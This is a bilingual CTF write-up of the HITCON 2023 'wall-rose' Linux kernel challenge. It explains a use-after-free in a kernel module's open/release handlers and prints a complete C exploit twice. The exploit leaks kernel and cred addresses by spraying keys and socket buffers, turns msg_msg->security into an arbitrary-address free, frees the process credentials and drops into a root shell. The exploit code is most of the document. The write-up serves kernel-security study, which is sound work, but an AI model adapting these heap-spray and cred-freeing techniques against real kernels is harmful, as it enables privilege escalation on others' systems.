---
title: 2023-hitcon-wall-rose
title_ko: 2023-hitcon-wall-rose
lang: en
draft: false
date: 2026-02-20
tags:
  - linux-kernel
  - UAF
  - writeup
description: wall rose writeup
description_ko: wall rose writeup
---

[lang:ko]

# Write-Up

[[2023-hitcon-wall-sina|wall-sina]]처럼 버그는 단순하다. `rose_open()`에서 `data`는 kmalloc-1k에서 관리하는 크기로 할당되고, `rose_release()`에서 `data`는 검증 없이 해제된다. 따라서 `data`에 저장된 dangling pointer를 다시 해제함으로써 Double Free 또는 UAF가 발생할 수 있다.

```c
#define MAX_DATA_HEIGHT 0x400

static char *data;

static int rose_open(struct inode *inode, struct file *file) {
    data = kmalloc(MAX_DATA_HEIGHT, GFP_KERNEL);
    if (!data) {
        printk(KERN_ERR "Wall Rose: kmalloc error\\n");
        return -1;
    }
    memset(data, 0, MAX_DATA_HEIGHT);
    return 0;
}

static int rose_release(struct inode *inode, struct file *file) {
    kfree(data);
    return 0;
}
```

이 문제는 다음과 같은 과정을 통해 해결했다.

1. `current->cred`의 주소 유출
   `struct user_key_payload`를 덮어써서 OOB Read primitive를 획득했다.
   ```c
   struct user_key_payload {
       struct rcu_head rcu;        /* RCU destructor */
       unsigned short  datalen;    /* length of this data */
       char        data[] __aligned(__alignof__(u64)); /* actual data */
   };
   ```
   읽은만한 객체를 찾던 중 [DirtyCred](https://zplin.me/papers/DirtyCred.pdf) 논문을 찾아 `struct sock`이 `current->cred`를 멤버 변수로 가지고 있음을 알게 되었다. `struct sock`도 kmalloc-1k에서 관리되므로 `current->cred`의 주소를 유출할 수 있었다.
2. 해제하고 싶은 주소를 `msg->security`에 넣고 `free_msg`를 트리거하여 Arbitrary Address Free primitive를 획득했고, Arbitrary Address Free primitive를 사용해서 `current->cred` 해제를 해제 했다.
3. root cred를 할당하기 위해 UMH 트리거
   잘못된 헤더가 있는 바이너리(예: `\\xff\\xff\\xff\\xff`)를 실행하여 UMH를 트리거했다.

# 여담

이 문제를 풀 때 사용했던 방식과 유사한 [논문](https://leeyoochan.github.io/assets/pdf/DirtyFree_NDSS_2026.pdf)이 최근에 게재되었다는걸 알게 되었다. 내가 했던 생각들이 논문으로 표현된 걸 보니 뭔가 신기했다. 대표적으로 cred object를 io_uring을 이용해서 spray하고 cred 주소를 추측한 뒤, AAF primitive를 이용해서 추측한 cred 주소를 free한다는 방식을 사용하는 방법을 소개하는데, spray를 하더라도 partial overwrite 만으로 cred 주소를 맞추는 방식은 성공확률이 떨어지다보니 개선여지가 있어보인다.

논문에서 제시한 arbitrary free object에서 보통 generic cache에서 할당 받은 object를 victim으로 사용하는데, 이 점을 생각했을 때는 cred object보다 pipe_buffer object를 free해서 pipe_buffer UAF 취약점으로 pivot한다던지 아님 이 문제처럼 OOB read primitive를 한번 더 만들어서 cred object의 주소를 구한다던지, 아님 kfree에서 slab으로 관리되지 않은 주소를 넣으면 아예 그 주소와 관련된 page 전체를 free 시켜주는데 이걸 이용해서 뭔가 page-UAF로 pivot 할 수 있을지도..

여러가지 Future Work로 할만한 것들이 많은 주제인 것 같다.

```c
void free_large_kmalloc(struct folio *folio, void *object)
{
	unsigned int order = folio_order(folio);

	if (WARN_ON_ONCE(order == 0))
		pr_warn_once("object pointer: 0x%p\n", object);

	kmemleak_free(object);
	kasan_kfree_large(object);
	kmsan_kfree_large(object);

	mod_lruvec_page_state(folio_page(folio, 0), NR_SLAB_UNRECLAIMABLE_B,
			      -(PAGE_SIZE << order));
	__free_pages(folio_page(folio, 0), order);
}


void kfree(const void *object)
{
	struct folio *folio;
	struct slab *slab;
	struct kmem_cache *s;

	trace_kfree(_RET_IP_, object);

	if (unlikely(ZERO_OR_NULL_PTR(object)))
		return;

	folio = virt_to_folio(object);
	if (unlikely(!folio_test_slab(folio))) {
		free_large_kmalloc(folio, (void *)object);
		return;
	}

	slab = folio_slab(folio);
	s = slab->slab_cache;
	__kmem_cache_free(s, (void *)object, _RET_IP_);
}
```

# Exploit

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>
#include <string.h>
#include <keyutils.h>
#include <errno.h>
#include <sched.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

#define SPRAY_CNT 0xc
#define CRED_SPRAY_CNT 0x100

int mod_fd;
int mod_fd2;
int sockpairs[SPRAY_CNT][2];
int keys[SPRAY_CNT];
int msqids[CRED_SPRAY_CNT];

uint64_t kbase = 0;
uint64_t kheapbase = 0;
uint64_t modprobe_path = 0;
uint64_t core_pattern = 0;
uint64_t current_cred = 0;

void fatal(const char *msg)
{
    fprintf(stderr, "[-] %s: %m\\n", msg);
    exit(EXIT_FAILURE);
}

void hexdump(void *mem, unsigned int len)
{
    unsigned int i, j;

    for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
    {
        /* print offset */
        if(i % HEXDUMP_COLS == 0)
        {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len)
        {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        else /* end of block, just aligning for ASCII dump */
        {
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
        {
            for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
            {
                if(j >= len) /* end of block, not really printing */
                {
                    putchar(' ');
                }
                else if(isprint(((char*)mem)[j])) /* printable char */
                {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                else /* other char */
                {
                    putchar('.');
                }
            }
            putchar('\\n');
        }
    }
}

int alloc_key(int id, char *buff, size_t size)
{
	char desc[256] = { 0 };
    char *payload;
    int key;

    size -= 0x18; // sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff)
        memset(payload, id, size);

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    return key;
}

int spray_skbuff(int sockpairs[SPRAY_CNT][2], const void *buf, size_t size)
{
    for (int i = 0; i < SPRAY_CNT; i++) {
        if (write(sockpairs[i][0], buf, size) < 0) {
            fatal("write");
            return -1;
        }
    }

    return 0;
}

void aaf(uint64_t addr)
{
    char payload[0x400 - 0x140];
    uint64_t *payload_u64;

    mod_fd = open("/dev/rose", O_RDWR);
    if (mod_fd < 0)
        fatal("open(\\"/dev/rose\\")");

    mod_fd2 = open("/dev/rose", O_RDWR);
    if (mod_fd2 < 0)
        fatal("open(\\"/dev/rose\\")");

    close(mod_fd);

    for (int i = 0; i < SPRAY_CNT; i++) {
        msqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        if (msqids[i] < 0)
            fatal("msgget");

        struct {
            long mtype;
            char mtext[0x300];
        } msg;

        memset(msg.mtext, 'A', sizeof(msg.mtext) - 1);
        msg.mtype = 1;

        if (msgsnd(msqids[i], &msg, sizeof(msg.mtext), 0) < 0){
            fatal("msgsnd");
        }
    }

    close(mod_fd2);

    memset(payload, '\\x00', sizeof(payload));
    payload_u64 = payload;
    payload_u64[0] = modprobe_path - 8; /* m_list.next */
    payload_u64[1] = modprobe_path - 8; /* m_list.prev */
    payload_u64[2] = 0x2; /* m_type */
    payload_u64[3] = 0x300; /* m_ts */
    payload_u64[4] = 0; /* next */
    payload_u64[5] = addr; /* security */

    spray_skbuff(sockpairs, payload, sizeof(payload));

    struct {
        long mtype;
        char mtext[0x300];
    } data;

    data.mtype = 1;
    memset(data.mtext, 0, sizeof(data.mtext));

    printf("[+] UAF => Arbitrary Address Free\\n");

    for (int i = 0; i < SPRAY_CNT; i++)
        msgrcv(msqids[i], &data, sizeof(data.mtext), 2, IPC_NOWAIT);
}

int main(void)
{
    prctl(PR_SET_NAME, "slyfizzVSg0riya");

    init_modprobe();

    mod_fd = open("/dev/rose", O_RDWR);
    if (mod_fd < 0)
        fatal("open(\\"/dev/rose\\")");

    mod_fd2 = open("/dev/rose", O_RDWR);
    if (mod_fd2 < 0)
        fatal("open(\\"/dev/rose\\")");

    /* kmalloc-1024 영역을 가리키는 dangling potiner 생성 */
    close(mod_fd);

    for (int i = 0; i < SPRAY_CNT; i++) {
        keys[i] = alloc_key(i, NULL, 0x400);
        if (keys[i] < 0)
            fatal("alloc_key");
    }

    printf("[+] UAF => OOB Read\\n");

    /* Double Free 보다 사용하기 좋은 UAF로 전환 */
    close(mod_fd2);

    /* UAF 성공 기원하기 */
    for (int i = 0; i < SPRAY_CNT; i++)
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockpairs[i]) < 0)
            fatal("socketpair");

    char payload[0x400 - 0x140];
    uint64_t *payload_u64;

    memset(payload, '\\x00', sizeof(payload));
    payload_u64 = payload;
    payload_u64[0] = 0; /* rcu */
    payload_u64[1] = 0; /* rcu */
    payload_u64[2] = 0x2000; /* size */
    payload_u64[3] = 0xcafebabedeadbeef;

    spray_skbuff(sockpairs, payload, sizeof(payload));

    unsigned char buffer[0x2000];

    for (int i = 0; i < SPRAY_CNT; i++) {
        keyctl(KEYCTL_READ, keys[i], buffer, sizeof(buffer), 0);
        if (*(uint64_t *)buffer == 0xcafebabedeadbeef) {
            // hexdump(buffer, sizeof(buffer));

            for (int j = 0; j < sizeof(buffer); j++) {
                if (buffer[j] == 0xc0 && buffer[j+1] == 0x4a) {
                    kbase = *(uint64_t *)(&buffer[j]) - 0x26e4ac0;
                    kheapbase = *(uint64_t *)(&buffer[j + 0x40]) & 0xfffffffff0000000;
                    current_cred = *(uint64_t *)(&buffer[j + 0x218]);
                    break;
                }
            }
        }
    }

    if (kbase == 0 || kheapbase == 0 || current_cred == 0)
        fatal("leak");

    modprobe_path = kbase + 0x1c51e20;
    core_pattern = kbase + 0x1d690c0;

    printf("[+] kbase: %#lx\\n", kbase);
    printf("[+] kheapbase: %#lx\\n", kheapbase);
    printf("[+] modprobe_path: %#lx\\n", modprobe_path);
    printf("[+] core_pattern: %#lx\\n", core_pattern);
    printf("[+] current_cred: %#lx\\n", current_cred);

    /* Second Stage */

    pid_t child_pid;

    child_pid = fork();

    if (child_pid) {
        /* parant */
        aaf(current_cred);
        aaf(current_cred + 0xc0);
        aaf(current_cred + 0xc0 * 2);

        while (1) {
            if (getuid() == 0)
                break;
        }
        system("/bin/sh");
    } else {
        int tmp_fd;

        sleep(3);

        execve("/tmp/x", NULL, NULL);

        while (1);
    }

    return 0;
}
```

[lang:en]

> [!warning] This post was translated by an LLM. If you would like to read the original, please click the globe icon in the top-left corner.

# Write-Up

Like [[2023-hitcon-wall-sina|wall-sina]], the bug is simple. In `rose_open()`, `data` is allocated with a size managed by kmalloc-1k. In `rose_release()`, `data` is freed without any validation. Therefore, a Double Free or UAF can occur by freeing the dangling pointer saved in `data` again.

```c
#define MAX_DATA_HEIGHT 0x400

static char *data;

static int rose_open(struct inode *inode, struct file *file) {
    data = kmalloc(MAX_DATA_HEIGHT, GFP_KERNEL);
    if (!data) {
        printk(KERN_ERR "Wall Rose: kmalloc error\\n");
        return -1;
    }
    memset(data, 0, MAX_DATA_HEIGHT);
    return 0;
}

static int rose_release(struct inode *inode, struct file *file) {
    kfree(data);
    return 0;
}
```

I solved this challenge as follows:

1. Leak address of `current->cred`
   I obtained an OOB Read primitive by overwriting `struct user_key_payload`

   ```c
   struct user_key_payload {
       struct rcu_head rcu;        /* RCU destructor */
       unsigned short  datalen;    /* length of this data */
       char        data[] __aligned(__alignof__(u64)); /* actual data */
   };
   ```

   I found this paper ([https://zplin.me/papers/DirtyCred.pdf](https://zplin.me/papers/DirtyCred.pdf)) and realized that `struct sock` has `current->cred` as a member variable. I was able to leak the address of `current->cred` because `struct sock` is also managed by kmalloc-1k.

2. Free `current->cred` using Arbitrary Address Free primitive
   I obtained an AAF primitive by placing the address I wanted to free in `msg->security` and triggering `free_msg`.

   ```c
   void security_msg_msg_free(struct msg_msg *msg)
   {
   	call_void_hook(msg_msg_free_security, msg);
   	kfree(msg->security);
   	msg->security = NULL;
   }

   void free_msg(struct msg_msg *msg)
   {
   	struct msg_msgseg *seg;

   	security_msg_msg_free(msg);

   	seg = msg->next;
   	kfree(msg);
   	while (seg != NULL) {
   		struct msg_msgseg *tmp = seg->next;

   		cond_resched();
   		kfree(seg);
   		seg = tmp;
   	}
   }
   ```

3. Trigger UMH to allocate root cred.
   I triggered UMH by running a binary with a invalid header (e.g. `\\xff\\xff\\xff\\xff`).

# Additional Notes

While solving this challenge, I learned that a recently published [paper](https://leeyoochan.github.io/assets/pdf/DirtyFree_NDSS_2026.pdf) discusses an approach similar to mine. It was interesting to see ideas I had while solving this challenge expressed in a formal paper.

One representative approach in the paper is to spray cred objects using io_uring, guess the cred address, and then free the guessed cred address using an AAF primitive. Even with spraying, however, matching the cred address through partial overwrite alone seems to have a relatively low success rate, so there appears to be room for improvement.

For future work, there seem to be several promising directions: pivoting by freeing a `pipe_buffer` object and using a pipe_buffer UAF, creating another OOB read primitive to recover the cred address more reliably (as in this challenge), or leveraging the behavior where `kfree` may free an entire page when given a non-slab-managed address and attempting a page-UAF pivot.

# Exploit

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>
#include <string.h>
#include <keyutils.h>
#include <errno.h>
#include <sched.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

#define SPRAY_CNT 0xc
#define CRED_SPRAY_CNT 0x100

int mod_fd;
int mod_fd2;
int sockpairs[SPRAY_CNT][2];
int keys[SPRAY_CNT];
int msqids[CRED_SPRAY_CNT];

uint64_t kbase = 0;
uint64_t kheapbase = 0;
uint64_t modprobe_path = 0;
uint64_t core_pattern = 0;
uint64_t current_cred = 0;

void fatal(const char *msg)
{
    fprintf(stderr, "[-] %s: %m\\n", msg);
    exit(EXIT_FAILURE);
}

void hexdump(void *mem, unsigned int len)
{
    unsigned int i, j;

    for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
    {
        /* print offset */
        if(i % HEXDUMP_COLS == 0)
        {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len)
        {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        else /* end of block, just aligning for ASCII dump */
        {
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
        {
            for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
            {
                if(j >= len) /* end of block, not really printing */
                {
                    putchar(' ');
                }
                else if(isprint(((char*)mem)[j])) /* printable char */
                {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                else /* other char */
                {
                    putchar('.');
                }
            }
            putchar('\\n');
        }
    }
}

int alloc_key(int id, char *buff, size_t size)
{
	char desc[256] = { 0 };
    char *payload;
    int key;

    size -= 0x18; // sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff)
        memset(payload, id, size);

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    return key;
}

int spray_skbuff(int sockpairs[SPRAY_CNT][2], const void *buf, size_t size)
{
    for (int i = 0; i < SPRAY_CNT; i++) {
        if (write(sockpairs[i][0], buf, size) < 0) {
            fatal("write");
            return -1;
        }
    }

    return 0;
}

void aaf(uint64_t addr)
{
    char payload[0x400 - 0x140];
    uint64_t *payload_u64;

    mod_fd = open("/dev/rose", O_RDWR);
    if (mod_fd < 0)
        fatal("open(\\"/dev/rose\\")");

    mod_fd2 = open("/dev/rose", O_RDWR);
    if (mod_fd2 < 0)
        fatal("open(\\"/dev/rose\\")");

    close(mod_fd);

    for (int i = 0; i < SPRAY_CNT; i++) {
        msqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        if (msqids[i] < 0)
            fatal("msgget");

        struct {
            long mtype;
            char mtext[0x300];
        } msg;

        memset(msg.mtext, 'A', sizeof(msg.mtext) - 1);
        msg.mtype = 1;

        if (msgsnd(msqids[i], &msg, sizeof(msg.mtext), 0) < 0){
            fatal("msgsnd");
        }
    }

    close(mod_fd2);

    memset(payload, '\\x00', sizeof(payload));
    payload_u64 = payload;
    payload_u64[0] = modprobe_path - 8; /* m_list.next */
    payload_u64[1] = modprobe_path - 8; /* m_list.prev */
    payload_u64[2] = 0x2; /* m_type */
    payload_u64[3] = 0x300; /* m_ts */
    payload_u64[4] = 0; /* next */
    payload_u64[5] = addr; /* security */

    spray_skbuff(sockpairs, payload, sizeof(payload));

    struct {
        long mtype;
        char mtext[0x300];
    } data;

    data.mtype = 1;
    memset(data.mtext, 0, sizeof(data.mtext));

    printf("[+] UAF => Arbitrary Address Free\\n");

    for (int i = 0; i < SPRAY_CNT; i++)
        msgrcv(msqids[i], &data, sizeof(data.mtext), 2, IPC_NOWAIT);
}

int main(void)
{
    prctl(PR_SET_NAME, "slyfizzVSg0riya");

    init_modprobe();

    mod_fd = open("/dev/rose", O_RDWR);
    if (mod_fd < 0)
        fatal("open(\\"/dev/rose\\")");

    mod_fd2 = open("/dev/rose", O_RDWR);
    if (mod_fd2 < 0)
        fatal("open(\\"/dev/rose\\")");

    /* kmalloc-1024 영역을 가리키는 dangling potiner 생성 */
    close(mod_fd);

    for (int i = 0; i < SPRAY_CNT; i++) {
        keys[i] = alloc_key(i, NULL, 0x400);
        if (keys[i] < 0)
            fatal("alloc_key");
    }

    printf("[+] UAF => OOB Read\\n");

    /* Double Free 보다 사용하기 좋은 UAF로 전환 */
    close(mod_fd2);

    /* UAF 성공 기원하기 */
    for (int i = 0; i < SPRAY_CNT; i++)
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockpairs[i]) < 0)
            fatal("socketpair");

    char payload[0x400 - 0x140];
    uint64_t *payload_u64;

    memset(payload, '\\x00', sizeof(payload));
    payload_u64 = payload;
    payload_u64[0] = 0; /* rcu */
    payload_u64[1] = 0; /* rcu */
    payload_u64[2] = 0x2000; /* size */
    payload_u64[3] = 0xcafebabedeadbeef;

    spray_skbuff(sockpairs, payload, sizeof(payload));

    unsigned char buffer[0x2000];

    for (int i = 0; i < SPRAY_CNT; i++) {
        keyctl(KEYCTL_READ, keys[i], buffer, sizeof(buffer), 0);
        if (*(uint64_t *)buffer == 0xcafebabedeadbeef) {
            // hexdump(buffer, sizeof(buffer));

            for (int j = 0; j < sizeof(buffer); j++) {
                if (buffer[j] == 0xc0 && buffer[j+1] == 0x4a) {
                    kbase = *(uint64_t *)(&buffer[j]) - 0x26e4ac0;
                    kheapbase = *(uint64_t *)(&buffer[j + 0x40]) & 0xfffffffff0000000;
                    current_cred = *(uint64_t *)(&buffer[j + 0x218]);
                    break;
                }
            }
        }
    }

    if (kbase == 0 || kheapbase == 0 || current_cred == 0)
        fatal("leak");

    modprobe_path = kbase + 0x1c51e20;
    core_pattern = kbase + 0x1d690c0;

    printf("[+] kbase: %#lx\\n", kbase);
    printf("[+] kheapbase: %#lx\\n", kheapbase);
    printf("[+] modprobe_path: %#lx\\n", modprobe_path);
    printf("[+] core_pattern: %#lx\\n", core_pattern);
    printf("[+] current_cred: %#lx\\n", current_cred);

    /* Second Stage */

    pid_t child_pid;

    child_pid = fork();

    if (child_pid) {
        /* parant */
        aaf(current_cred);
        aaf(current_cred + 0xc0);
        aaf(current_cred + 0xc0 * 2);

        while (1) {
            if (getuid() == 0)
                break;
        }
        system("/bin/sh");
    } else {
        int tmp_fd;

        sleep(3);

        execve("/tmp/x", NULL, NULL);

        while (1);
    }

    return 0;
}
```
